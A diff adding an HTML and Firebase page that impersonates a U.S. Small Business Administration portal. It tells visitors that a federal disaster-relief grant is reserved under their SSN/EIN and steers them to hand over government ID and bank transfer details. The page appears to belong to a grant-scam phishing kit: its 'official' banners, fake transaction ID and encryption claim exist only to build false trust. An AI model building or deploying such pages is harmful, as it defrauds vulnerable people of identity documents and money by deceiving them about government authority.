@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Access Granted</title>
+    <style>
+        :root { --sba-blue: #00274c; --sba-green: #10b981; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 16px; text-align: center; }
+        
+        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
+        .card { background: white; padding: 35px 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border-top: 6px solid var(--sba-green); text-align: center; }
+        
+        .success-glow {
+            width: 60px; height: 60px; background: #ecfdf5; color: var(--sba-green);
+            border-radius: 50%; font-size: 30px; margin: 0 auto 15px;
+            display: flex; justify-content: center; align-items: center; border: 2px solid var(--sba-green);
+        }
+
+        .allocation-letter {
+            background: #fff; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px;
+            text-align: left; margin: 25px 0; position: relative; overflow: hidden;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.02);
+        }
+        .allocation-letter::before {
+            content: "OFFICIAL"; position: absolute; top: 10px; right: -25px;
+            transform: rotate(45deg); background: #fee2e2; color: #ef4444;
+            font-size: 10px; font-weight: 900; padding: 5px 30px; border: 1px dashed #ef4444;
+        }
+
+        .step-row { display: flex; gap: 15px; margin-bottom: 20px; text-align: left; }
+        .step-num { 
+            width: 28px; height: 28px; background: #f1f5f9; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            font-weight: 900; color: var(--sba-blue); font-size: 12px; flex-shrink: 0;
+            border: 1px solid #cbd5e1;
+        }
+
+        .action-btn {
+            background: var(--sba-blue); color: white; padding: 18px; border-radius: 10px;
+            width: 100%; font-weight: 800; border: none; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px; margin-top: 20px;
+            transition: 0.3s;
+        }
+        .action-btn:hover { background: #003a70; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - PROVISIONING COMPLETE
+    </div>
+
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:14px; letter-spacing:2px; font-weight: 900;">REGISTRATION SUCCESS</h1>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="success-glow">✓</div>
+            <h2 style="color: var(--sba-blue); margin: 0; font-size: 22px;">Account Provisioned</h2>
+            <p style="color: #64748b; font-size: 13px; margin-top: 8px;">Your 2026 Disaster Relief Profile is now active.</p>
+
+            <div class="allocation-letter">
+                <p style="font-size: 10px; color: #94a3b8; margin: 0; font-weight: 700;">MEMORANDUM FOR:</p>
+                <p id="userName" style="font-size: 14px; font-weight: 900; color: var(--sba-blue); margin: 5px 0 15px;">PROVISIONING IDENTITY...</p>
+                
+                <p style="font-size: 11px; color: #475569; line-height: 1.5; margin-bottom: 10px;">
+                    This serves as formal notice that based on your 2026 registration profile, a federal grant allocation has been provisionally reserved under your SSN/EIN:
+                </p>
+                
+                <div style="background: #f8fafc; padding: 10px; border-radius: 6px; border-left: 4px solid var(--sba-blue);">
+                    <span style="font-size: 10px; color: #64748b; font-weight: 800; text-transform: uppercase;">Current Allocation:</span>
+                    <div id="userBal" style="font-size: 24px; font-weight: 900; color: var(--sba-blue);">$0.00</div>
+                </div>
+            </div>
+
+            <div class="step-row">
+                <div class="step-num">1</div>
+                <div>
+                    <b style="font-size: 12px; color: var(--sba-blue);">IDENTITY VERIFICATION</b>
+                    <p style="font-size: 11px; color: #64748b; margin: 4px 0;">Satisfy Patriot Act compliance by providing valid government-issued identification.</p>
+                </div>
+            </div>
+
+            <div class="step-row">
+                <div class="step-num">2</div>
+                <div>
+                    <b style="font-size: 12px; color: var(--sba-blue);">DISBURSEMENT SETUP</b>
+                    <p style="font-size: 11px; color: #64748b; margin: 4px 0;">Configure your Electronic Funds Transfer (EFT) destination in the secure ledger.</p>
+                </div>
+            </div>
+
+            <button onclick="location.href='dashboard.html'" class="action-btn">Enter Secure Portal</button>
+        </div>
+
+        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 25px; font-family: monospace;">
+            SBA_CORE_TX_ID: <span id="sessionID"></span><br>
+            ENCRYPTION: AES-256-GCM
+        </p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) { 
+                window.location.href = 'index.html'; 
+                return; 
+            }
+            
+            // SECURITY CHECK: If they haven't verified email, kick them back to verify page
+            if (!user.emailVerified) {
+                window.location.href = 'verify.html';
+                return;
+            }
+            
+            try {
+                const snap = await getDoc(doc(db, "users", user.uid));
+                if(snap.exists()) {
+                    const data = snap.data();
+                    // Formal name formatting
+                    document.getElementById('userName').innerText = (data.fullName || "VALUED CITIZEN").toUpperCase();
+                    
+                    // Number formatting for the balance
+                    const rawBal = data.balance || 0;
+                    const balance = typeof rawBal === 'string' ? parseFloat(rawBal.replace(/,/g, '')) : parseFloat(rawBal);
+                    
+                    document.getElementById('userBal').innerText = "$" + balance.toLocaleString('en-US', {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    });
+                }
+            } catch (error) {
+                console.error("Profile lookup failed");
+            }
+        });
+
+        document.getElementById('sessionID').innerText = "SBA-TX-" + Math.random().toString(36).substr(2, 9).toUpperCase();
+    </script>
+</body>
+</html>
